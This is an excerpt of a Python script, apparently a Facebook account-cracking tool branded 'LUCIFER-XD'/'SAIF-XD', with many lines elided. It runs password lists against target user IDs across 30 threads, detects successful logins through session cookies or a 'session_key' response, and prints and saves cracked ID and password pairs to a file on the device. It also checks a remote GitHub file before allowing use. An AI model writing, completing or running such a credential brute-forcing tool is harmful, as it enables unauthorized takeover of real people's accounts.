...
logo= ("""\033[1;37m
  _     _    _  _____ _____ ______ ______ _____  
 | |   | |  | |/ ____|_   _|  ____|  ____|  __ \ 
 | |   | |  | | |      | | | |__  | |__  | |__) |
 | |   | |  | | |      | | |  __| |  __| |  _  / 
 | |___| |__| | |____ _| |_| |    | |____| | \ \ 
 |______\____/ \_____|_____|_|    |______|_|  \_\. 
----------------------------------------------
 Author    : Lʋcɩʆɘʀ Xwɗ
 Github    : [ ERROR ]
 Facebook  : Lʋcɩʆɘʀ Xwɗ
 Tool Name : SAIF-XD
\033[1;37m----------------------------------------------""")
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/Kshepyastra/approval/blob/main/approval.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://www.facebook.com/Adwaita.Nanda')
      time.sleep(1)
      exit()
  except: 
...
def pak():
                ...
                with tred(max_workers=30) as Hakku:     
                        ...
                        for psx in user:
                                ...
                                Hakku.submit(rndm,ids,passlist)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [LUCIFER-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Hakku=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in Hakku:
                                ...
                                print('\r\r\033[1;32m [LUCIFER-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\x1b[38;5;208m [LUCIFER-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [HAKKU-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/LUCIFER-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [HAKKU-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/LUCIFER-OK.txt','a').write(uid+'|'+pas+'\n')
